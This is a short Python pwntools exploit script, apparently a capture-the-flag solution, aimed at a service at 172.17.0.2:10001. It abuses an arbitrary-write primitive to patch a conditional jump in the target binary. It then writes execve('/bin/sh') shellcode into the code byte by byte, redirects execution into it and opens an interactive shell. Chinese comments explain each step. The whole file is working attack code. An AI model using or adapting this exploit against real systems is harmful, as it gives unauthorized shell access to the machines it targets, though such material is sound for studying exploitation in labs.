#!/usr/bin/python
#coding:utf-8

from pwn import *

context.update(arch = 'i386', os = 'linux', timeout = 1)
io = remote('172.17.0.2', 10001)

patch_jne_address = 0x080485da		#jnz loc_80485E9所在地址
shellcode_address = 0x080485db		#shellcode放置的地址

shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
#xor eax, eax
#push eax
#push 68732F2Fh
#push 6E69622Fh
#mov ebx, esp
#push eax
#push ebx
#mov ecx, esp
#mov al, 0Bh
#int 80h

io.sendline(str(patch_jne_address))
io.sendline(str(0xc2))				#将jnz loc_80485E9改成jnz loc_804859D，重复执行两个call __isoc99_scanf读取shellcode

for i in xrange(len(shellcode)):			#逐字节写入shellcode到jnz loc_80485E9指令后面
	io.sendline(str(shellcode_address+i))
	io.sendline(str(ord(shellcode[i])))

io.sendline(str(patch_jne_address))
io.sendline(str(0x00))				#写完shellcode后改为jnz loc_80485DB，执行shellcode

io.recv()							#把垃圾数据读走

io.interactive()